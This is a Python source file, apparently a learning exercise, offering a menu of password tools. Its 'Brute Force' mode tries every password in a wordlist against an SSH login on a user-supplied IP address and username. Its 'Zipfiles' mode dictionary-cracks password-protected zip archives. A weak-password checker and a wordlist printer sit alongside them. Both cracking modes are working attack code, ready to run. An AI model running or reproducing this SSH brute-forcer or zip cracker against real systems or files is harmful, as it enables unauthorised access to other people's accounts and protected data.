
# Import Libiaries 
from zipfile import ZipFile
import time
import paramiko
import ipaddress

# Vars
port = 22
sshConnection = paramiko.SSHClient()

def ip():
    # Verify if host is a valid IP address
    try:
        ipaddress.ip_address(host)
        print(f"{host} is a valid IP address")
        return True
    except ValueError:
        print(f"{host} is an invalid IP address")
        return False

def connect(password):
    # Connect to SSH with provided username and password
    sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        sshConnection.connect(host, port, user, password,timeout=30, banner_timeout=200)
        print(f"[+] Successfully authenticated with password: {password}")
        sshConnection.close()
        return True
    except paramiko.AuthenticationException:
        # Wrong password
        print("Incorrect password, trying new one: ")
        return False
    except Exception as e:
        # Unable to establish SSH connection
        print(f"[-] Exception occurred: {e}")
        return False
        
def mode1():
    # User input word list file path
    filepath = input("Enter your dictionary filepath:\n")
    #Open the file 
    file = open(filepath)
    line = file.readline()
    # Iterate through each word in given list
    while line:
        line = line.rstrip()
        word = line
        time.sleep(1)
        print(word)
        line = file.readline()
    file.close()
def mode2():
    # User input word list file path and see if password is on list
    filepath = input("Enter your wordlist filepath:\n")
    password = input("Please type your new password: \n")
    with open(filepath) as file:
        for line in file:
            if line.strip() == password:
                print("Password is weak!")
                return
    print("Password is strong!")
def mode3():
    # Brute force SSH
    # User input for password list
    filepath = input("Enter your wordlist filepath:\n")
    # if not a real IP address, return
    if not ip():
        return
    # open file and use function connect() to plug password 
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            if connect(password):
                break


def mode4():
    # Get the zip file path and password file path from the user
    zip_file_path = input("What is the path to the zip file: ")
    password_file_path = input("What password path would you like: ")

    # Open the password file and read the passwords into a list
    with open(password_file_path, encoding="ISO-8859-1") as password_file:
        passwords = [password.strip() for password in password_file]

    # Create a ZipFile object using the zip file path
    with ZipFile(zip_file_path) as zip_object:

        for password in passwords:
            try:
                # Try to extract the files using the password
                zip_object.extractall(pwd=password.encode('utf-8'))
                print("Extraction successful.")
                return True
            except:
                # If the password is incorrect, try the next one
                print("Incorrect password, trying new one: ")
# If none of the passwords worked, print an error message
        else:
            print("None of the passwords worked.")
            return False
def menu():
    print("Select an option:")
    print("Mode 1: Iterator ")
    print("Mode 2: Password Check")
    print("Mode 3: Brute Force")
    print("Mode 4 Zipfiles")
    print("Exit to Exit")

# main
while True:
   menu()
   choice = input("Enter your choice: ")
   if choice == "Mode 1":
       mode1()
   elif choice == "Mode 2":
       mode2()
   elif choice == "Mode 3":
       host = input("Please provide an IP address to connect to: ")
       user = input("Please provide a username: ")
       mode3()
   elif choice == "Mode 4":
       mode4()
   elif choice == "Exit":
       break
   else:
       print("Invaild choice")
# end
